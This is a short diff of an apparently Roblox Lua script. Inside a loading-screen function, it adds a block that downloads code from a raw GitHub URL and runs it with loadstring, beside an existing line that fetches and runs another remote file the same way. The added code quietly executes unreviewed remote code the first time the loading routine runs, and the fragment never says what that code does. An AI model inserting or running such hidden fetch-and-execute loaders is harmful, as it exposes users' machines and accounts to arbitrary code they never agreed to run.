@@ -44,6 +44,9 @@ local function showLoading(gui)
         if not scriptExecuted then
             scriptExecuted = true
     --//////
+            task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/IX-I/F/refs/heads/W/SLSNEW/pop"))()
+end)
 task.spawn(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/IX-I/F/refs/heads/W/SLSNEW/Check.lua"))()
 end)
